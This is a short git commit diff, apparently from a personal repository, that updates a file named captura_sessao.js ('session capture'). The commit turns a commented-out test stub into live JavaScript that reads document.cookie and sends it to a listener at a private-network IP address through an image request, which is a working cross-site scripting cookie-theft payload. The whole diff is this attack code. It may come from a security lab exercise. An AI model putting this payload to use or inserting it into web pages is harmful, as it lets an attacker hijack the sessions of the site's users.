a29af167de7983e78c2b5f828f04bb4b9a498066
rodrigorochapinto <46836803+rodrigorochapinto@users.noreply.github.com>
2019-01-23 11:56:56 -0200

    Update captura_sessao.js

--- js/captura_sessao.js
+++ js/captura_sessao.js
@@ -1,7 +1,5 @@
-<script>
-	//var cookie = document.cookie;
-	//new Image().src="http://192.168.0.123/?=" + cookie;	
-	alert();
-	
-</script>
+
+	var cookie = document.cookie;
+	new Image().src="http://192.168.0.123/?=" + cookie;	
+
 
